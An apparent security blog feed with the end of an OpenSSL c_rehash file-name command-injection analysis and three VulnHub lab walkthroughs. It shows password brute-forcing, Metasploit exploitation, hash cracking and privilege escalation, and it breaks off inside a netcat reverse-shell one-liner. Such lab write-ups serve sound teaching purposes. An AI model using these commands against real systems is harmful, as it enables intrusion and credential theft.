class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要流程为</p><pre class="line-numbers language-none"><code class="language-none">-&gt; hash_dir-&gt; check_file-&gt; hash_dir-&gt; link_hash_cert<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>获取用户从命令行传入的参数，然后判断是否存在对应目录，存在的情况下检测其读写权限，如果都通过则进入 <code>hash_dir()</code> 方法中</p><p>在该方法中会读取下目标目录下的所有文件</p><p><img src="/../../../../pic/Pasted%20image%2020230227164326.png"></p><p>并判断文件中是否包含 <code>(pem)|(crt)|(cer)|(crl)</code>，如果包含的情况下会进入到 <code>check_file()</code> 方法中判断文件开头是否为 <code>-----BEGIN (.*)-----</code>，如果不是的话会导致程序意外退出</p><p>随后回到 <code>hash_dir()</code> 方法中执行，步入到 <code>link_hash_cert</code> 方法中，并将满足条件的文件塞入到下面语句中执行</p><pre class="line-numbers language-none"><code class="language-none">my ($hash, $fprint) = `"$openssl" x509 $x509hash -fingerprint -noout -in "$fname"`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这一句语句之前均未对文件名进行一些过滤处理导致我们可以在文件名处进行命令注入</p><p><img src="/../../../../pic/Pasted%20image%2020230227164425.png"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><a href="https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=e5fd1728ef4c7a5bf7c7a7163ca60370460a6e23;hp=982fad3ec4107684a6cb442f593193972b06c41a">官方修复</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - DERPNSTINK_1</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-derpnstink-1/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-derpnstink-1/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-DERPNSTINK-1"><a href="#VulnHub-DERPNSTINK-1" class="headerlink" title="VulnHub - DERPNSTINK_1"></a>VulnHub - DERPNSTINK_1</h1><h2 id="1-前言-amp-搭建"><a href="#1-前言-amp-搭建" class="headerlink" title="1. 前言&amp;搭建"></a>1. 前言&amp;搭建</h2><p>VulnhHub靶场链接：<a href="https://www.vulnhub.com/entry/derpnstink-1,221/">https://www.vulnhub.com/entry/derpnstink-1,221/</a></p><p>网络拓扑</p><table><thead><tr><th>作用</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td>Kali</td><td>192.168.0.102</td></tr><tr><td>靶机</td><td>Ubuntu</td><td>192.168.0.101</td></tr></tbody></table><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-获取目标-IP-地址"><a href="#2-1-获取目标-IP-地址" class="headerlink" title="2.1 获取目标 IP 地址"></a>2.1 获取目标 IP 地址</h3><p>使用 nmap 进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token number">192.168</span>.80.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-端口服务探测"><a href="#2-2-端口服务探测" class="headerlink" title="2.2 端口服务探测"></a>2.2 端口服务探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822090443.png"></p><p>确定存在服务</p><table><thead><tr><th>端口</th><th>服务</th><th>功能</th><th>可能性</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>提供远程登录服务</td><td>密码</td></tr><tr><td>21</td><td>ftp</td><td>提供文件传输服务</td><td>匿名用户登录</td></tr><tr><td>80</td><td>http</td><td>提供web服务功能</td><td>渗透测试</td></tr></tbody></table><h2 id="3-网页渗透"><a href="#3-网页渗透" class="headerlink" title="3. 网页渗透"></a>3. 网页渗透</h2><p>访问 80 端口获得一个网页，只有一只图片，没给啥信息</p><p><img src="/../../../../pic/Pasted%20image%2020220822090430.png"></p><p>检查页面源码，获取到第一个 flag</p><p><img src="/../../../../pic/Pasted%20image%2020220822090544.png"></p><p>获取到提示信息</p><p><img src="/../../../../pic/Pasted%20image%2020220822090603.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&lt;-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到用户名 stinky，提示需要绑定 dns，不知道具体绑定到哪个 dns 暂时先不管</p><p>进行目录扫描</p><p><img src="/../../../../pic/Pasted%20image%2020220822090713.png"></p><p>获取到 phpmyadmin 以及一个 weblog</p><p>进入到 phpmyadmin 提示报错</p><p><img src="/../../../../pic/Pasted%20image%2020220822090847.png"></p><p>暂不知晓用户名以及密码</p><h3 id="3-1-WordPress-Getshell"><a href="#3-1-WordPress-Getshell" class="headerlink" title="3.1 WordPress Getshell"></a>3.1 WordPress Getshell</h3><p>访问 weblog 结果跳转到了 derpnstink.local 域名上，绑定一下 dns 解析后进行访问</p><p><img src="/../../../../pic/Pasted%20image%2020220822091218.png"></p><p>使用 WordPress 进行搭建，访问后台 wp-login.php，使用 hydra 进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> admin <span class="token parameter variable">-P</span> /usr/share/wordlists/fasttrack.txt <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.0.101 http-post-form <span class="token string">"/weblog/wp-login.php:log=^USER^&amp;pwd=^PASS^:error"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822095007.png"></p><p>获取到账户 admin / admin</p><p>使用 wpscan 进行进一步漏洞扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> <span class="token string">"xxx"</span> --api-token <span class="token string">"xxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822095418.png"></p><p>可能存在文件上传漏洞，搜索一下漏洞编号可用的 exp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolesearch CVE:CVE-2014-5460<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822095703.png"></p><p>存在 exp，使用进行攻击后获得 shell</p><p><img src="/../../../../pic/Pasted%20image%2020220822095927.png"></p><p>转为 tty</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 /etc/passwd</p><p><img src="/../../../../pic/Pasted%20image%2020220822114000.png"></p><p>获取到存在两个用户 mrderp  以及 stinky，可能可以用于 ssh 登录</p><p>没有找到好的提取方法，由于存在 phpmyadmin 先获取一下数据库密码，在 wp-config.php 中获取到数据库密码</p><p><img src="/../../../../pic/Pasted%20image%2020220822101057.png"></p><p>使用账户  root / mysql 登录 phpmyadmin</p><p>在  wp_users 表中发现另一个用户 unclestinky 以及其密文</p><p><img src="/../../../../pic/Pasted%20image%2020220822112758.png"></p><p>使用 hydra 破解下用户密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">400</span> hash.txt rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822112717.png"></p><p>获得账户  unclestinky / wedgie57，登录进后台找到第二个 flag</p><p><img src="/../../../../pic/Pasted%20image%2020220822113846.png"></p><p>没用什么可以深入的东西了</p><h2 id="4-端口渗透"><a href="#4-端口渗透" class="headerlink" title="4. 端口渗透"></a>4. 端口渗透</h2><h3 id="4-1-FTP-21-端口"><a href="#4-1-FTP-21-端口" class="headerlink" title="4.1 FTP - 21  端口"></a>4.1 FTP - 21  端口</h3><p>通过上面的网页渗透可以获取到一些用户信息</p><p>Username:</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">rootadminunclestinkymrderpstinky<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Password:</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">wedgie57mysqladmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进行一波暴力破解</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"root<span class="token entity" title="\n">\n</span>admin<span class="token entity" title="\n">\n</span>unclestinky<span class="token entity" title="\n">\n</span>mrderp<span class="token entity" title="\n">\n</span>stinky"</span> <span class="token operator">&gt;</span> users.txt<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"wedgie57<span class="token entity" title="\n">\n</span>mysql<span class="token entity" title="\n">\n</span>admin"</span> <span class="token operator">&gt;</span> passwd.txt hydra <span class="token parameter variable">-L</span> users.txt <span class="token parameter variable">-P</span> passwd.txt <span class="token parameter variable">-s</span> <span class="token number">21</span> <span class="token number">192.168</span>.0.101 <span class="token function">ftp</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822114601.png"></p><p>获取到账户  stinky / wedgie57</p><p><img src="/../../../../pic/Pasted%20image%2020220822115625.png"></p><p>找到 ssh 登录所需要的证书</p><p>以及一段对话</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?12:07 stinky: yeah. did you need a password reset?12:07 mrderp: I think i accidently deleted my account12:07 mrderp: i just need to logon once to make a change12:07 stinky: im gonna packet capture so we can figure out whats going on12:07 mrderp: that seems a bit overkill, but wtv12:08 stinky: commence the sniffer!!!!12:08 mrderp: -_-12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?12:11 mrderp: awesome it works!12:12 stinky: we really are the best sysadmins #team12:13 mrderp: i guess we are...12:15 mrderp: alright I made the changes, feel free to decomission my account12:20 stinky: done! yay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概就是重置密码，进行抓包查看发生历史记录</p><h3 id="4-2-SSH-22-端口"><a href="#4-2-SSH-22-端口" class="headerlink" title="4.2 SSH - 22 端口"></a>4.2 SSH - 22 端口</h3><p>使用证书进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> stinky@192.168.0.101 <span class="token parameter variable">-i</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>key.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在目录下找到到第三个flag</p><p><img src="/../../../../pic/Pasted%20image%2020220822120813.png"></p><p>在  Documents 下获取到流量包</p><p><img src="/../../../../pic/Pasted%20image%2020220822121029.png"></p><p>根据 ftp 中获取到的聊天记录可得知流量包中可能存在修改密码的流量记录，过滤一下 http 流量</p><p><img src="/../../../../pic/Pasted%20image%2020220822121515.png"></p><p>获取到账户 mrderp / derpderpderpderpderpderpderp，进行登录 ssh</p><p>在 Desktop 下存在文件 helpdesk.log</p><p>提到了一个网址 <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a></p><p><img src="/../../../../pic/Pasted%20image%2020220822125342.png"></p><p>获得提示</p><p><img src="/../../../../pic/Pasted%20image%2020220822125413.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">mrderp ALL=(ALL) /home/mrderp/binaries/derpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是考查的一个 linux sudo 命令知识点，</p><p>大概意思：</p><p>允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/目录下derpy开头的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822125608.png"></p><p>进行写入文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /home/mrderp/binaries/<span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">&gt;</span> /home/mrderp/binaries/derpy.sh<span class="token function">chmod</span> <span class="token number">4777</span> /home/mrderp/binaries/derpy.sh<span class="token function">sudo</span> /home/mrderp/binaries/derpy.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020220822125914.png"></p><p>获得 root 权限，在 root 用户桌面上找到第四个 flag</p><p><img src="/../../../../pic/Pasted%20image%2020220822130009.png"></p><h2 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h2><ul><li>WordPress 插件 Getshell</li><li>sudo 提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - CORROSION_2</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-corrosion-2/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-corrosion-2/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-CORROSION-2"><a href="#VulnHub-CORROSION-2" class="headerlink" title="VulnHub - CORROSION_2"></a>VulnHub - CORROSION_2</h1><h2 id="0、靶场链接"><a href="#0、靶场链接" class="headerlink" title="0、靶场链接"></a>0、靶场链接</h2><p><a href="https://www.vulnhub.com/entry/corrosion-2,745/">VulnHub</a></p><p>难度：中等</p><h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><h3 id="1-1、主机发现"><a href="#1-1、主机发现" class="headerlink" title="1.1、主机发现"></a>1.1、主机发现</h3><p>使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018113945.png"></p><h3 id="1-2、端口扫描"><a href="#1-2、端口扫描" class="headerlink" title="1.2、端口扫描"></a>1.2、端口扫描</h3><p>使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.1.103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018114102.png"></p><p>开放了 80 端口与 8080 端口</p><h2 id="2、WEB"><a href="#2、WEB" class="headerlink" title="2、WEB"></a>2、WEB</h2><p>访问 8080 端口，扫描下目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go run .<span class="token punctuation">\</span>main.go <span class="token function">dir</span> <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.1.103:8080/"</span> <span class="token parameter variable">-w</span> <span class="token string">"./db/directory-list-lowercase-2.3-big.txt"</span> <span class="token parameter variable">-x</span> php,zip,html,txt,tar,bak <span class="token parameter variable">-t</span> <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018170833.png"></p><p>访问 readme.txt </p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Hey randy! It's your System Administrator. I left you a file on the server, I'm sure nobody will find it.Also remember to use that password I gave you.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 backup.zip 下载下来一个压缩包，但是有密码，使用字典爆破一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fcrackzip <span class="token parameter variable">-D</span> <span class="token parameter variable">-p</span> <span class="token string">"/usr/share/wordlists/rockyou.txt"</span> <span class="token parameter variable">-u</span> backup.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018172129.png"></p><p>解压后在 tomcat-users.xml 中获得用户名与密码</p><p><img src="/../../../../pic/Pasted%20image%2020221018180745.png"></p><h2 id="3、拿-shell"><a href="#3、拿-shell" class="headerlink" title="3、拿 shell"></a>3、拿 shell</h2><p>使用 msfconsole 框架</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/http/tomcat_mgr_upload<span class="token builtin class-name">set</span> HttpPassword melehifokivai<span class="token builtin class-name">set</span> HttpUSername admin<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.1.103<span class="token builtin class-name">set</span> RPORT <span class="token number">8080</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018190427.png"></p><p>获得交互 shell，转 tty</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shellpython3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018190628.png"></p><p>在 /home/randy 目录下获得 user.txt 文件</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ca73a018ae6908a7d0ea5d1c269ba4b6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入 jaye 目录下</p><p><img src="/../../../../pic/Pasted%20image%2020221018191656.png"></p><p>没有读取的权限，使用刚才获取到的 tomcat 的密码登录 jaye</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> jayemelehifokivai<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221018191812.png"></p><p>在 Files 下存在一个 look 文件</p><p><img src="/../../../../pic/Pasted%20image%2020221018192556.png"></p><p>可以实现任意文件读取</p><h2 id="4、-提权"><a href="#4、-提权" class="headerlink" title="4、 提权"></a>4、 提权</h2><p>破解用户密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./look <span class="token string">''</span> <span class="token string">'/etc/shadow'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得密码 hash 值</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>hashcat.exe <span class="token parameter variable">--show</span> <span class="token parameter variable">-m</span> <span class="token number">1800</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-o</span> crack.txt .<span class="token punctuation">\</span>password.txt .<span class="token punctuation">\</span>rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得用户密码</p><p><img src="/../../../../pic/Pasted%20image%2020221019140751.png"></p><p>登录  randy 用户 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> randy07051986randy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在 randy 用户目录下存在 randombase64.py</p><p><img src="/../../../../pic/Pasted%20image%2020221019145550.png"></p><p>该文件属于root用户，但是任何人都可以执行，且会以 root 用户的身份执行</p><pre class="line-numbers language-none"><code class="language-none">import base64message = input("Enter your string: ")message_bytes = message.encode('ascii')base64_bytes = base64.b64encode(message_bytes)base64_message = base64_bytes.decode('ascii')print(base64_message)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>包含了 base64 文件，找一下源文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/lib/python3.8<span class="token function">ls</span> <span class="token parameter variable">-la</span> base64*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221019145902.png"></p><p>修改 base64.py</p><p>先导入 os 模块</p><p><img src="/../../../../pic/Pasted%20image%2020221019150154.png"></p><p>在 b64encode 中加入 </p><p><img src="/../../../../pic/Pasted%20image%2020221019150248.png"></p><p>查看可以执行的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221019150854.png"></p><p>执行命令</p><p><img src="/../../../../pic/Pasted%20image%2020221019150910.png"></p><h2 id="5、flag"><a href="#5、flag" class="headerlink" title="5、flag"></a>5、flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> ~<span class="token function">cat</span> ~/root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221019150945.png"></p><h2 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h2><p><a href="https://www.cnblogs.com/sainet/p/15668420.html">https://www.cnblogs.com/sainet/p/15668420.html</a></p><p><a href="https://www.cnblogs.com/sainet/p/15668420.html#%E4%B8%89%E6%8F%90%E6%9D%83">https://www.cnblogs.com/sainet/p/15668420.html#%E4%B8%89%E6%8F%90%E6%9D%83</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub - EMPIRE_BREAKOUT</title>
      <link href="/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-empire-breakout/"/>
      <url>/2023/01/28/penetrationstest/ba-chang-xue-xi/vulnhub/vulnhub-empire-breakout/</url>
      
        <content type="html"><![CDATA[<h1 id="VulnHub-EMPIRE-BREAKOUT"><a href="#VulnHub-EMPIRE-BREAKOUT" class="headerlink" title="VulnHub - EMPIRE_BREAKOUT"></a>VulnHub - EMPIRE_BREAKOUT</h1><h2 id="0-靶场搭建"><a href="#0-靶场搭建" class="headerlink" title="0. 靶场搭建"></a>0. 靶场搭建</h2><p><a href="https://www.vulnhub.com/entry/empire-breakout,751/">VulnHub</a></p><p>难度：简单</p><h2 id="1-信息收集与利用"><a href="#1-信息收集与利用" class="headerlink" title="1. 信息收集与利用"></a>1. 信息收集与利用</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.31.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017165631.png"></p><p>靶机 IP 为 192.168.31.214</p><h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><p>使用命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.31.214<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017170413.png"></p><p>开启了 80端口，并且使用了 Webmin 服务与 SMB 服务，Webmin是功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器访问Webmin的各种管理功能并完成相应的管理动作。</p><h2 id="2-Web"><a href="#2-Web" class="headerlink" title="2. Web"></a>2. Web</h2><p>访问 80 端口，在源码中找到一段注释</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&lt;!--don't worry no one will get here, it's safe to share with you my access. Its encrypted :)++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密一下</p><p><img src="/../../../../pic/Pasted%20image%2020221017171336.png"></p><p>获得结果</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">.2uqPEfj3D&lt;P'a-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于开启了smb服务，我们可以用命令搜集靶机更多的相关信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token parameter variable">-a</span> <span class="token number">192.168</span>.31.214<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017171809.png"></p><p>探测到用户 cyber</p><p>在 20000 端使用  cyber / .2uqPEfj3D&lt;P’a-3 登录上</p><p><img src="/../../../../pic/Pasted%20image%2020221017172053.png"></p><p>可以进行命令执行</p><p><img src="/../../../../pic/Pasted%20image%2020221017172039.png"></p><p>在用户目录下找到第一个 flag</p><p><img src="/../../../../pic/Pasted%20image%2020221017172210.png"></p><p>tar 属于 root 用户，尝试利用进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap <span class="token function">tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017172315.png"></p><p>并且可以读取任意文件</p><p><img src="/../../../../pic/Pasted%20image%2020221017172658.png"></p><p>在 /var/backups 下发现对密码的备份，使用 tar 压缩出来</p><pre class="line-numbers language-none"><code class="language-none">./tar -cvf pass.tar /var/backups/.old_pass.baktar -xvf pass.tarcat var/backups/.old_pass.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221017173115.png"></p><p>获取到密码为 Ts&amp;4&amp;YurgtRX(=~h</p><h2 id="3-拿-shell"><a href="#3-拿-shell" class="headerlink" title="3. 拿 shell"></a>3. 拿 shell</h2><p>攻击机监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nv <span class="token parameter variable">-lvnp</span> <span class="token number">19023</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span 